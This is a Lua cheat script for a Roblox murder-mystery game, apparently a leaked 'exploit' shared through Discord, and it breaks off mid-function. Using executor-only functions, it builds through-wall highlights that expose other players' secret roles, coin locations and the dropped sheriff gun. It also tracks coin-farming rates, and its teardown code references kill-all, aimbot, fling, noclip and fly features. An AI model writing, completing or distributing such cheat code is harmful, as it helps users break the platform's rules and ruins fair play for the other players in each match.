
local Players
Players = game:GetService("Players")
local RunService
RunService = game:GetService("RunService")
local ReplicatedStorage
ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService
UserInputService = game:GetService("UserInputService")
local TweenService
TweenService = game:GetService("TweenService")
local localPlayer
localPlayer = Players.LocalPlayer
local gameplay
gameplay = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Gameplay")
local CurrentRoundClient
CurrentRoundClient = require(ReplicatedStorage.Modules.CurrentRoundClient)
local request_
local request_2 = http_request or request or syn and syn.request or fluxus and fluxus.request

if request_2 then
	request_ = request_2
else
	request_ = http and http.request
end

local func1

func1 = function(url)
	local ok, result = pcall(function()
		return game:HttpGet(url)
	end)

	if ok and type(result) == "string" and #result > 0 then
		return result
	end

	if type(request_) ~= "function" then
		warn("HTTP request is not supported")
		return nil
	end
	local ok2, result2 = pcall(request_, { Url = url, Method = "GET", Headers = { ["User-Agent"] = "Roblox" } })
	if not ok2 then
		warn("HTTP request failed: " .. tostring(result2))
		return nil
	end

	if type(result2) == "string" then
		return result2
	end

	if type(result2) == "table" then
		local num1 = tonumber(result2.StatusCode or result2.Status)
		local body = result2.Body or result2.body
		if (not num1 or num1 >= 200 and num1 < 400) and type(body) == "string" and #body > 0 then
			return body
		end
	end

	warn("HTTP request returned an invalid response")
	return nil
end

pcall(function()
	if _G.__InRoundGuardConn then
		_G.__InRoundGuardConn:Disconnect()
	end

	if _G.StopRoleFling then
		_G.StopRoleFling()
	end

	if _G.AutoFarmSetEnabled then
		_G.AutoFarmSetEnabled(false)
	end

	if _G.AntiFlingSetEnabled then
		_G.AntiFlingSetEnabled(false)
	end

	if _G.PlayerFlySetEnabled then
		_G.PlayerFlySetEnabled(false)
	end

	if _G.CoinESPConn then
		for _, item in ipairs(_G.CoinESPConn) do
			pcall(function()
				item:Disconnect()
			end)
		end
	end

	if _G.RoleESPConn then
		for _, item2 in ipairs(_G.RoleESPConn) do
			pcall(function()
				item2:Disconnect()
			end)
		end
	end

	_G.__RoleRefreshBurstId = nil
	_G.ESPGlowEnabled = nil
	_G.ESPGlowSetEnabled = nil

	if _G.AutoFarmCharConn then
		_G.AutoFarmCharConn:Disconnect()
	end

	if _G.AutoFarmDiedConn then
		_G.AutoFarmDiedConn:Disconnect()
	end

	if _G.CoinESPFolder then
		_G.CoinESPFolder:Destroy()
	end

	if _G.RoleESPFolder then
		_G.RoleESPFolder:Destroy()
	end

	_G.__DailyQuestLoopId = nil

	if _G.DailyQuestCheckerGui then
		_G.DailyQuestCheckerGui:Destroy()
	end

	_G.__QuickShootLoopId = nil
	_G.__FarmStatsLoopId = nil
	_G.__HomeLoopId = nil

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegQuickShotCameraLock")
	end)

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegShiftLockAim")
	end)

	if _G.QuickShootGui then
		_G.QuickShootGui:Destroy()
	end

	if _G.QuickRageShootButtonSetEnabled then
		_G.QuickRageShootButtonSetEnabled(false)
	end

	if _G.QuickRageShootGui then
		_G.QuickRageShootGui:Destroy()
	end

	if _G.AutoThrowKnifeSetEnabled then
		_G.AutoThrowKnifeSetEnabled(false)
	end

	_G.__AutoThrowKnifeLoopId = nil
	_G.__KillAllLoopId = nil

	if _G.ThrowAimbotButtonSetEnabled then
		_G.ThrowAimbotButtonSetEnabled(false)
	end

	if _G.ThrowAimbotGui then
		_G.ThrowAimbotGui:Destroy()
	end

	if _G.KillAllButtonSetEnabled then
		_G.KillAllButtonSetEnabled(false)
	end

	if _G.KillAllGui then
		_G.KillAllGui:Destroy()
	end

	if _G.FlingMurdererButtonGui then
		_G.FlingMurdererButtonGui:Destroy()
	end

	if _G.FlingSheriffButtonGui then
		_G.FlingSheriffButtonGui:Destroy()
	end

	if _G.BombBoostButtonGui then
		_G.BombBoostButtonGui:Destroy()
	end

	for _, item3 in ipairs({ "NoclipButtonGui", "FlyButtonGui", "InfJumpButtonGui", "WallJumpButtonGui" }) do
		if _G[item3] then
			_G[item3]:Destroy()
		end
	end

	_G.__PlayerButtonLightLoop = nil

	if _G.TriggerFOVGui then
		_G.TriggerFOVGui:Destroy()
		_G.TriggerFOVGui = nil
	end

	if _G.TriggerMarkerGui then
		_G.TriggerMarkerGui:Destroy()
	end

	if _G.ShiftLockCrosshairSetEnabled then
		pcall(function()
			_G.ShiftLockCrosshairSetEnabled(false)
		end)
	end

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegTriggerFOVRing")
	end)

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegTriggerMarker")
	end)

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegCrosshair")
	end)

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegHideShiftLockCursor")
	end)

	pcall(function()
		RunService:UnbindFromRenderStep("MM2SupportHandPose")
	end)

	pcall(function()
		RunService:UnbindFromRenderStep("MarbegESPOverlay")
	end)

	if _G.ESPOverlayGui then
		_G.ESPOverlayGui:Destroy()
	end

	if _G.InfiniteJumpSetEnabled then
		_G.InfiniteJumpSetEnabled(false)
	end

	if _G.WallJumpSetEnabled then
		_G.WallJumpSetEnabled(false)
	end

	if _G.NoclipSetEnabled then
		_G.NoclipSetEnabled(false)
	end

	if _G.AutoGrabGunSetEnabled then
		_G.AutoGrabGunSetEnabled(false)
	end

	_G.__AutoGrabGunLoopId = nil

	if _G.StretchModeSetEnabled then
		_G.StretchModeSetEnabled(false)
	end

	if _G.StretchClone then
		_G.StretchClone:Destroy()
	end

	if _G.TwoHandHoldSetEnabled then
		_G.TwoHandHoldSetEnabled(false)
	end

	if _G.GripTunerSetEnabled then
		_G.GripTunerSetEnabled(false)
	end

	if _G.BulletTracerSetEnabled then
		_G.BulletTracerSetEnabled(false)
	end

	if _G.BulletTracerFolder then
		_G.BulletTracerFolder:Destroy()
	end

	if _G.GunKillEffectSetEnabled then
		_G.GunKillEffectSetEnabled(false)
	end

	if _G.GunKillFXFolder then
		_G.GunKillFXFolder:Destroy()
	end

	if _G.__KillFxConns then
		for _, killFxConn in ipairs(_G.__KillFxConns) do
			pcall(function()
				killFxConn:Disconnect()
			end)
		end
	end

	if _G.KillFxGui then
		_G.KillFxGui:Destroy()
	end

	if _G.WorldVisualsReset then
		pcall(_G.WorldVisualsReset)
	end

	if _G.CameraSettingsReset then
		pcall(_G.CameraSettingsReset)
	end

	_G.KnifeAuraEnabled = false

	if _G.__GunKillEffectConn then
		_G.__GunKillEffectConn:Disconnect()
	end

	local value1 = _G
	local value2 = _G
	_G.GunKillEffectSetEnabled = nil
	value1.GunKillEffectSetColor = nil
	value2.__PlayGunKillFX = nil
	local value3 = _G
	_G.__GunKillEffectConn = nil
	value3.GunKillFXFolder = nil

	if _G.FpsBoostSetEnabled then
		_G.FpsBoostSetEnabled(false)
	end

	_G.__FarmWebhookLoopId = nil

	if _G.AutoCaseSetEnabled then
		_G.AutoCaseSetEnabled(false)
	end

	_G.__AutoCaseLoopId = nil
	_G.__AutoCaseUiLoopId = nil

	if _G.WindUIWindow and _G.WindUIWindow.Destroy then
		_G.WindUIWindow:Destroy()
	end

	if _G.ObsidianWindow and _G.ObsidianWindow.Unload then
		_G.ObsidianWindow:Unload()
	end
end)

do
	local ok, result = pcall(function()
		return gethui()
	end)

	if ok and result then
		for _, child in ipairs(result:GetChildren()) do
			if child.Name == "ScreenGui" then
				pcall(function()
					child:Destroy()
				end)
			end
		end
	end
end

pcall(function()
	local character = localPlayer.Character

	if character then
		for _, descendant in ipairs(character:GetDescendants()) do
			if descendant:IsA("BasePart") then
				descendant.CanCollide = true
			end
		end

		local humanoid = character:FindFirstChildWhichIsA("Humanoid")

		if humanoid then
			humanoid.PlatformStand = false
			humanoid.WalkSpeed = 16
		end
	end
end)

_G.ScriptVersion = "v3.7.1"
_G.PerformanceMode = true
_G.LockButtonsEnabled = false
_G.__ActionButtons = {}
_G.__ActionButtonLayouts = {}

_G.LockButtonsSetEnabled = function(flag1)
	_G.LockButtonsEnabled = flag1 and true or false
end

print("Loading " .. _G.ScriptVersion)
local func2

func2 = function()
	local ok, result = pcall(function()
		return gethui()
	end)

	if ok and result then
		return result
	end
	return game:GetService("CoreGui")
end

_G.__RealInRound = next(CurrentRoundClient.PlayerData) ~= nil
_G.InRound = _G.__RealInRound
_G.BagFull = false
local bagPollLoopId = {}
_G.__BagPollLoopId = bagPollLoopId

task.spawn(function()
	while _G.__BagPollLoopId == bagPollLoopId do
		task.wait(0.2)
		local bagFull = false

		pcall(function()
			local playerGui = localPlayer:FindFirstChild("PlayerGui")
			local container = playerGui and playerGui:FindFirstChild("MainGUI") and playerGui.MainGUI:FindFirstChild("Game") and playerGui.MainGUI.Game:FindFirstChild("CoinBags") and playerGui.MainGUI.Game.CoinBags:FindFirstChild("Container")

			if container then
				for _, child in ipairs(container:GetChildren()) do
					local fullBagIcon = child:FindFirstChild("FullBagIcon")
					if fullBagIcon and fullBagIcon.Visible then
						bagFull = true
						break
					end
				end
			end
		end)

		_G.BagFull = bagFull
	end
end)

local tbl1, func3

do
	local folder = Instance.new("Folder")
	folder.Name = "MarbegCoinESP"
	folder.Parent = func2()
	_G.CoinESPFolder = folder
	tbl1 = {}
	_G.CoinESPEnabled = false

	local function func4(instance2)
		local tbl2 = {}

		for _, descendant in ipairs(instance2:GetDescendants()) do
			if descendant:IsA("BasePart") and descendant.Transparency < 1 then
				table.insert(tbl2, descendant)
			end
		end

		if #tbl2 == 0 and instance2:IsA("BasePart") and instance2.Transparency < 1 then
			table.insert(tbl2, instance2)
		end

		return tbl2
	end

	local value4 = nil

	local function func5(param1, param2)
		if not (_G.CoinESPEnabled and _G.InRound) then
			return
		end

		if param1.highlight then
			if param1.highlight.Parent and param1.highlight.Adornee and param1.highlight.Adornee.Parent then
				param1.highlight.Enabled = true
				return
			end
			value4(param1)
		end

		local visualPart = param1.visualPart

		if not visualPart or not visualPart.Parent or visualPart.Transparency >= 1 then
			visualPart = func4(param2)[1]
			param1.visualPart = visualPart
		end

		if not visualPart then
			return
		end
		local highlight = Instance.new("Highlight")
		highlight.FillColor = Color3.fromRGB(255, 200, 0)
		highlight.OutlineColor = Color3.fromRGB(255, 235, 120)
		highlight.FillTransparency = 0
		highlight.OutlineTransparency = 0
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		highlight.Adornee = visualPart
		highlight.Parent = folder
		param1.highlight = highlight
	end

	value4 = function(param3)
		if param3.highlight then
			pcall(function()
				param3.highlight:Destroy()
			end)

			param3.highlight = nil
		end
	end

	_G.FarmCoinsCollected = 0
	_G.FarmCoinTimes = {}

	_G.__FarmCountPickup = function(num2)
		local character = localPlayer.Character
		character = character and character:FindFirstChild("HumanoidRootPart")
		if not character or (character.Position - num2).Magnitude > 16 then
			return
		end
		_G.FarmCoinsCollected = _G.FarmCoinsCollected + 1
		local farmCoinTimes = _G.FarmCoinTimes
		table.insert(farmCoinTimes, os.clock())

		while true do
			local len2 = #farmCoinTimes > 0

			if len2 then
				local first1 = farmCoinTimes[1]
				len2 = os.clock() - first1 > 600
			end

			if len2 then
				table.remove(farmCoinTimes, 1)
				continue
			end
			break
		end
	end

	_G.FarmGetRates = function()
		local farmCoinTimes = _G.FarmCoinTimes
		if #farmCoinTimes < 2 then
			return 0, 0, #farmCoinTimes
		end
		local first2 = farmCoinTimes[1]
		local n = os.clock() - first2
		if n < 5 then
			return 0, 0, #farmCoinTimes
		end
		local n2 = #farmCoinTimes / n * 60
		return n2, n2 * 60, #farmCoinTimes
	end

	_G.FarmResetRates = function()
		_G.FarmCoinsCollected = 0
		_G.FarmCoinTimes = {}
	end

	func3 = function(part2, list1)
		if tbl1[part2] ~= list1 then
			return
		end
		pcall(_G.__FarmCountPickup, part2.Position)
		value4(list1)
		tbl1[part2] = nil

		if list1.connections then
			for _, connection in ipairs(list1.connections) do
				pcall(function()
					connection:Disconnect()
				end)
			end

			table.clear(list1.connections)
		end
	end

	local tbl3 = {
		{ "rareegg", 5 },
		{ "egg", 3 },
		{ "snowtoken", 3 },
		{ "token", 3 },
		{ "candy", 2.5 },
		{ "candie", 2.5 },
		{ "beachball", 2 },
	}

	local function func6(list2)
		local n = 1

		for _, descendant in ipairs(list2:GetDescendants()) do
			local lowered = string.lower(descendant.Name)

			for _, item4 in ipairs(tbl3) do
				if string.find(lowered, item4[1], 1, true) and item4[2] > n then
					n = item4[2]
				end
			end
		end

		return n
	end

	local value5 = nil

	value5 = function(instance3)
		if tbl1[instance3] then
			return
		end

		if not (instance3.Name == "Coin_Server" and instance3:IsA("BasePart")) then
			return
		end

		if not instance3.CanTouch then
			return
		end
		local list3 = func4(instance3)

		if #list3 == 0 then
			task.delay(0.1, function()
				if instance3.Parent and not tbl1[instance3] then
					value5(instance3)
				end
			end)

			return
		end

		local tbl4 = { part = instance3, visualPart = list3[1], highlight = nil, connections = {}, weight = func6(instance3) }
		tbl1[instance3] = tbl4
		func5(tbl4, instance3)

		table.insert(tbl4.connections, instance3.AncestryChanged:Connect(function(child, parent)
			if not parent then
				func3(instance3, tbl4)
			end
		end))

		table.insert(tbl4.connections, instance3:GetPropertyChangedSignal("CanTouch"):Connect(function()
			if not instance3.CanTouch then
				func3(instance3, tbl4)
			end
		end))

		for _, descendant in ipairs(instance3:GetDescendants()) do
			if descendant:IsA("BasePart") then
				table.insert(tbl4.connections, descendant:GetPropertyChangedSignal("Transparency"):Connect(function()
					if descendant.Transparency >= 0.5 then
						func3(instance3, tbl4)
					end
				end))
			end
		end
	end

	local function func7()
		for _, descendant in ipairs(workspace:GetDescendants()) do
			if descendant.Name == "Coin_Server" and descendant:IsA("BasePart") then
				value5(descendant)
			end
		end
	end

	local function func8()
		for k, value6 in pairs(tbl1) do
			local visualPart = value6.visualPart

			if not k.Parent or not k.CanTouch or not visualPart or not visualPart.Parent or visualPart.Transparency >= 0.5 then
				func3(k, value6)
			end
		end
	end

	func7()

	_G.CoinESPConn = {
		(workspace.DescendantAdded:Connect(function(descendant)
			if not (descendant.Name == "Coin_Server" and descendant:IsA("BasePart")) then
				local parent = descendant.Parent

				while true do
					local flag2 = parent and parent ~= workspace
					descendant = nil

					if flag2 then
						if parent.Name == "Coin_Server" and parent:IsA("BasePart") then
							descendant = parent
							break
						else
							parent = parent.Parent
							continue
						end
					end

					break
				end
			end

			if descendant then
				task.defer(value5, descendant)
			end
		end)),
	}

	local coinRescanLoopId = {}
	_G.__CoinRescanLoopId = coinRescanLoopId

	task.spawn(function()
		while _G.__CoinRescanLoopId == coinRescanLoopId do
			task.wait(1)
			pcall(func8)
		end
	end)

	local function refreshCoinVisibility()
		for _, value7 in pairs(tbl1) do
			if _G.CoinESPEnabled and _G.InRound then
				func5(value7, value7.part)
			else
				value4(value7)
			end
		end
	end

	_G.RefreshCoinVisibility = refreshCoinVisibility

	_G.CoinESPSetEnabled = function(coinESPEnabled)
		_G.CoinESPEnabled = coinESPEnabled
		refreshCoinVisibility()
	end

	_G.GetNearestCoinPos = function(num3)
		local huge = math.huge
		local position = nil
		local value8 = nil

		for k in pairs(tbl1) do
			if k.Parent then
				local magnitude = (k.Position - num3).Magnitude

				if magnitude < huge then
					position = k.Position
					huge = magnitude
					value8 = k
				end
			end
		end

		return value8, position, huge
	end

	_G.GetAllCoinCandidates = function(num4)
		local tbl5 = {}

		for k, value9 in pairs(tbl1) do
			if k.Parent then
				table.insert(tbl5, {
					part = k,
					pos = k.Position,
					dist = (k.Position - num4).Magnitude,
					weight = value9.weight or 1,
				})
			end
		end

		table.sort(tbl5, function(param4, param5)
			return param4.dist < param5.dist
		end)

		return tbl5
	end

	table.insert(_G.CoinESPConn, gameplay.RoundStart.OnClientEvent:Connect(function()
		_G.__RealInRound = true
	end))

	table.insert(_G.CoinESPConn, gameplay.GameOver.OnClientEvent:Connect(function()
		_G.__RealInRound = false
	end))

	_G.__InRoundGuardConn = RunService.Heartbeat:Connect(function()
		if _G.InRound ~= _G.__RealInRound then
			_G.InRound = _G.__RealInRound
			pcall(refreshCoinVisibility)
		end
	end)
end

table.insert(_G.CoinESPConn, _G.__InRoundGuardConn)
local tbl6, flag3, func9, func10, func11

do
	local folder = Instance.new("Folder")
	folder.Name = "MarbegRoleESP"
	folder.Parent = func2()
	_G.RoleESPFolder = folder
	_G.RoleESPEnabled = true
	_G.RoleTogglesEnabled = { Murderer = true, Sheriff = true, Innocent = true, Hero = true }
	_G.RoleNametagsEnabled = true
	_G.SheriffGunESPEnabled = true
	_G.ESPGlowEnabled = true
	tbl6 = {}
	flag3 = nil
	_G.__HeroOverride = {}
	_G.__HeroTiming = _G.__HeroTiming or {}

	_G.__IsHeroNow = function(obj)
		if _G.__HeroOverride[obj.Name] then
			return true
		end
		local character = obj.Character
		character = character and character:FindFirstChild("Gun")
		return character ~= nil and character:IsA("Tool")
	end

	_G.__CachedDroppedGun = nil
	_G.__DroppedGunScanAt = 0

	_G.__IsDroppedGunInstance = function(obj)
		if not obj then
			return false
		end

		if obj.Name == "GunDrop" or obj.Name == "DroppedGun" then
			return obj:IsA("BasePart") or obj:IsA("Model") or obj:IsA("Tool")
		end
		return obj:IsA("Tool") and obj.Name == "Gun" and obj.Parent == workspace
	end

	local roleColors = {
		Murderer = Color3.fromRGB(255, 0, 25),
		Sheriff = Color3.fromRGB(0, 105, 255),
		Innocent = Color3.fromRGB(0, 255, 75),
		Hero = Color3.fromRGB(255, 215, 0),
		Lobby = Color3.fromRGB(175, 120, 255),
	}

	_G.ESPFillEnabled = false

	local tbl7 = {
		Murderer = Color3.fromRGB(255, 0, 25),
		Sheriff = Color3.fromRGB(0, 105, 255),
		Innocent = Color3.fromRGB(0, 255, 75),
		Hero = Color3.fromRGB(255, 215, 0),
		Lobby = Color3.fromRGB(175, 120, 255),
	}

	func9 = function(param6)
		local entry1 = tbl6[param6]

		if entry1 then
			if entry1.highlight then
				pcall(function()
					entry1.highlight:Destroy()
				end)
			end

			if entry1.glow then
				pcall(function()
					entry1.glow:Destroy()
				end)
			end

			if entry1.billboard then
				pcall(function()
					entry1.billboard:Destroy()
				end)
			end

			if entry1.chams then
				pcall(function()
					entry1.chams.folder:Destroy()
				end)
			end

			if entry1.aura then
				pcall(function()
					entry1.aura:Destroy()
				end)
			end

			if entry1.conn then
				pcall(function()
					entry1.conn:Disconnect()
				end)
			end

			tbl6[param6] = nil
		end
	end
	-- https://discord.gg/x7YbZeezpm | 𝗦𝗟 | 𝗦𝗼𝘂𝗿𝗰𝗲 𝗟𝗲𝗮𝗸

	func10 = function()
		if flag3 then
			if flag3.highlight then
				pcall(function()
					flag3.highlight:Destroy()
				end)
			end

			if flag3.billboard then
				pcall(function()
					flag3.billboard:Destroy()
				end)
			end

			if flag3.conn then
				pcall(function()
					flag3.conn:Disconnect()
				end)
			end

			flag3 = nil
		end
	end

	func11 = function()
		local cachedDroppedGun = _G.__CachedDroppedGun
		if cachedDroppedGun and cachedDroppedGun.Parent and cachedDroppedGun:IsDescendantOf(workspace) and (cachedDroppedGun:IsA("BasePart") or cachedDroppedGun:FindFirstChild("Handle") or cachedDroppedGun:FindFirstChildWhichIsA("BasePart", true)) then
			return cachedDroppedGun
		end
		_G.__CachedDroppedGun = nil
		local now = os.clock()
		if now - (_G.__DroppedGunScanAt or 0) < 0.4 then
			return nil
		end
		_G.__DroppedGunScanAt = now

		for _, item5 in ipairs({ "GunDrop", "DroppedGun" }) do
			local flag4 = workspace:FindFirstChild(item5, true)
			if flag4 and _G.__IsDroppedGunInstance(flag4) then
				_G.__CachedDroppedGun = flag4
				return flag4
			end
		end

		local gun = workspace:FindFirstChild("Gun")
		if gun and _G.__IsDroppedGunInstance(gun) then
			_G.__CachedDroppedGun = gun
			return gun
		end
		return nil
	end

	local function func12()
		if not _G.SheriffGunESPEnabled then
			func10()
			return
		end
		local result1 = func11()
		if not result1 then
			func10()
			return
		end

		if flag3 and flag3.adornee == result1 and flag3.highlight and flag3.highlight.Parent == folder and flag3.billboard and flag3.billboard.Parent == folder then
			return
		end
		func10()
		local isBasePart = result1:IsA("BasePart") and result1 or result1:FindFirstChild("Handle") or result1:FindFirstChildWhichIsA("BasePart", true)
		if not isBasePart then
			return
		end
		local highlight = Instance.new("Highlight")
		highlight.FillColor = roleColors.Sheriff
		highlight.OutlineColor = Color3.new(1, 1, 1)
		highlight.FillTransparency = 0.1
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		highlight.Adornee = result1
		highlight.Parent = folder
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = "GunTag"
		billboardGui.Adornee = isBasePart
		billboardGui.Size = UDim2.fromOffset(100, 22)
		billboardGui.StudsOffset = Vector3.new(0, 1.6, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.AutoLocalize = false
		billboardGui.Parent = folder
		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.Size = UDim2.fromScale(1, 1)
		textLabel.Text = "Sheriff Gun"
		textLabel.TextColor3 = roleColors.Sheriff
		textLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
		textLabel.TextStrokeTransparency = 0.2
		textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
		textLabel.TextScaled = true
		textLabel.AutoLocalize = false
		textLabel.Parent = billboardGui

		flag3 = {
			highlight = highlight,
			billboard = billboardGui,
			conn = result1.AncestryChanged:Connect(function(child, parent)
				if not parent or not result1:IsDescendantOf(workspace) then
					func10()
				end
			end),
			adornee = result1,
		}
	end

	_G.ESPStyle = "Classic"
	_G.ESPFillOpacity = 0.88
	_G.__RoleColors = roleColors

	_G.__ESPLook = function(param7)
		local color = roleColors[param7] or Color3.new(1, 1, 1)
		if _G.ESPChams then
			local color2 = Color3.new(1, 1, 1)
			return color:Lerp(color2, 0.55), color:Lerp(color2, 0.85), 0.2
		end
		local espFillEnabled = _G.ESPFillEnabled

		if espFillEnabled then
			espFillEnabled = 1 - (_G.ESPFillOpacity or 0.88)
		end

		espFillEnabled = espFillEnabled or 1
		if _G.ESPStyle == "Neon" then
			local color2 = Color3.new(1, 1, 1)
			return color:Lerp(color2, 0.12), color:Lerp(color2, 0.75), espFillEnabled < 1 and math.max(0, espFillEnabled - 0.1) or 1
		end
		return color, tbl7[param7] or color, espFillEnabled
	end

	_G.ESPSetRoleColor = function(param8, param9)
		if typeof(param9) ~= "Color3" then
			return
		end
		roleColors[param8] = param9
		tbl7[param8] = param9

		if _G.__RefreshRoleESP then
			_G.__RefreshRoleESP()
		end
	end

	local function createHighlight(adornee, param10, parent)
		local value10, value11, value12 = _G.__ESPLook(param10)
		local highlight = Instance.new("Highlight")
		highlight.Name = "RoleHighlight_" .. tostring(param10)
		highlight:SetAttribute("MarbegRoleBase", true)
		highlight:SetAttribute("MarbegRole", param10)
		highlight.FillColor = value10
		highlight.OutlineColor = value11
		highlight.FillTransparency = value12
		highlight.OutlineTransparency = 0
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		highlight.Adornee = adornee
		highlight.Parent = parent
		return highlight
	end

	local function createHighlight2(adornee, param11, parent)
		local color = roleColors[param11] or Color3.new(1, 1, 1)
		local highlight = Instance.new("Highlight")
		highlight.Name = "RoleGlow_" .. tostring(param11)
		highlight:SetAttribute("MarbegRoleGlow", true)
		highlight.FillColor = color
		highlight.OutlineColor = color
		highlight.FillTransparency = 0.78
		highlight.OutlineTransparency = 0.28
		highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
		highlight.Adornee = adornee
		highlight.Parent = parent
		return highlight
	end

	_G.ESPFillSetEnabled = function(flag5)
		_G.ESPFillEnabled = flag5 and true or false

		for _, child in ipairs(folder:GetChildren()) do
			if child:IsA("Highlight") and child:GetAttribute("MarbegRoleBase") then
				child.FillTransparency = select(3, _G.__ESPLook(child:GetAttribute("MarbegRole")))
			end
		end
	end

	_G.ESPFillSetOpacity = function(param12)
		_G.ESPFillOpacity = math.clamp(tonumber(param12) or 0.88, 0, 1)
		_G.ESPFillSetEnabled(_G.ESPFillEnabled)
	end

	local function func13(player2, flag6)
		if player2 == localPlayer then
			return
		end
		local flag7 = flag6 == "Lobby"
		if not _G.RoleESPEnabled or flag7 and _G.InRound or not flag7 and (not _G.InRound or not _G.RoleTogglesEnabled[flag6]) then
			func9(player2.UserId)
			return
		end
		local character = player2.Character
		if not character then
			func9(player2.UserId)
			return
		end
		local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
		local head = character:FindFirstChild("Head")
		local humanoid = character:FindFirstChildWhichIsA("Humanoid")
		if not humanoidRootPart or not humanoid then
			func9(player2.UserId)
			return
		end
		local entry2 = tbl6[player2.UserId]
		local roleNametagsEnabled = flag7 or _G.RoleNametagsEnabled

		if entry2 and entry2.role == flag6 and entry2.character == character and entry2 and entry2.highlight and entry2.highlight.Parent == folder and entry2.highlight.Adornee == character and entry2 and (_G.ESPGlowEnabled and entry2.glow and entry2.glow.Parent == folder and entry2.glow.Adornee == character or not _G.ESPGlowEnabled and entry2.glow == nil) and entry2 and (roleNametagsEnabled and entry2.billboard and entry2.billboard.Parent == folder or not roleNametagsEnabled and entry2.billboard == nil) then
			entry2.highlight.Enabled = true

			if entry2.glow then
				entry2.glow.Enabled = _G.ESPGlowEnabled
			end

			return
		end

		func9(player2.UserId)
		local color = roleColors[flag6] or Color3.new(1, 1, 1)
		local highlight2 = createHighlight(character, flag6, folder)
		local espGlowEnabled = _G.ESPGlowEnabled and createHighlight2(character, flag6, folder) or nil
		local roleNametagsEnabled2 = flag7 or _G.RoleNametagsEnabled
		local billboardGui = nil

		if roleNametagsEnabled2 then
			billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "RoleTag_" .. player2.Name
			billboardGui.Adornee = head or humanoidRootPart
			billboardGui.Size = UDim2.fromOffset(170, 22)
			billboardGui.StudsOffsetWorldSpace = Vector3.new(0, 2.15, 0)
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 1500
			billboardGui.AutoLocalize = false
			billboardGui.Parent = folder
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "PlayerName"
			textLabel.BackgroundTransparency = 1
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold)
			textLabel.Text = player2.Name
			textLabel.TextColor3 = flag7 and Color3.fromRGB(225, 225, 235) or color
			textLabel.TextSize = 14
			textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
			textLabel.TextStrokeTransparency = 0
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextTruncate = Enum.TextTruncate.AtEnd
			textLabel.AutoLocalize = false
			textLabel.Parent = billboardGui

			if _G.ESPNametagAvatar and not flag7 then
				billboardGui.Size = UDim2.fromOffset(220, 26)
				local frame = Instance.new("Frame")
				frame.Name = "Row"
				frame.BackgroundTransparency = 1
				frame.Size = UDim2.fromScale(1, 1)
				frame.Parent = billboardGui
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.FillDirection = Enum.FillDirection.Horizontal
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
				uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Padding = UDim.new(0, 5)
				uiListLayout.Parent = frame
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.Name = "Avatar"
				imageLabel.LayoutOrder = 1
				imageLabel.Size = UDim2.fromOffset(22, 22)
				imageLabel.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
				imageLabel.BackgroundTransparency = 0.25
				imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. player2.UserId .. "&w=48&h=48"
				imageLabel.Parent = frame
				Instance.new("UICorner", imageLabel).CornerRadius = UDim.new(1, 0)
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = color
				uiStroke.Thickness = 1.5
				uiStroke.Parent = imageLabel
				textLabel.LayoutOrder = 2
				textLabel.Size = UDim2.fromScale(0, 1)
				textLabel.AutomaticSize = Enum.AutomaticSize.X
				textLabel.TextTruncate = Enum.TextTruncate.None
				textLabel.Parent = frame
			end
		end

		tbl6[player2.UserId] = {
			highlight = highlight2,
			glow = espGlowEnabled,
			billboard = billboardGui,
			conn = character.AncestryChanged:Connect(function(child, parent)
				if not parent then
					func9(player2.UserId)
				end
			end),
			role = flag6,
			character = character,
			player = player2,
		}
	end

	local function func14()
		if not _G.RoleESPEnabled then
			for k in pairs(tbl6) do
				func9(k)
			end

			func10()
			return
		end

		if not _G.InRound then
			func10()

			for k in pairs(tbl6) do
				func9(k)
			end

			return
		end

		for _, player in ipairs(Players:GetPlayers()) do
			local flag8 = CurrentRoundClient.PlayerData[player.Name]

			if flag8 and flag8.Role then
				if flag8.Dead then
					func9(player.UserId)

					if flag8.Role == "Sheriff" then
						func12()
					end
				elseif flag8.Role == "Murderer" or flag8.Role == "Sheriff" or flag8.Role == "Innocent" or flag8.Role == "Hero" then
					local role = flag8.Role

					if role == "Innocent" and _G.__IsHeroNow(player) then
						role = "Hero"
					end

					if flag8.Role == "Hero" then
						local flag9 = _G.__HeroTiming[player.Name]

						if flag9 and not flag9.pd then
							flag9.pd = os.clock()
						end
					end

					func13(player, role)
				end
			else
				func9(player.UserId)
			end
		end

		func12()
	end

	_G.RoleESPSetEnabled = function(roleESPEnabled)
		_G.RoleESPEnabled = roleESPEnabled
		func14()
	end

	_G.RoleESPSetTypeEnabled = function(param13, param14)
		_G.RoleTogglesEnabled[param13] = param14
		func14()
	end

	_G.ESPGlowSetEnabled = function(flag10)
		_G.ESPGlowEnabled = flag10 and true or false

		for k in pairs(tbl6) do
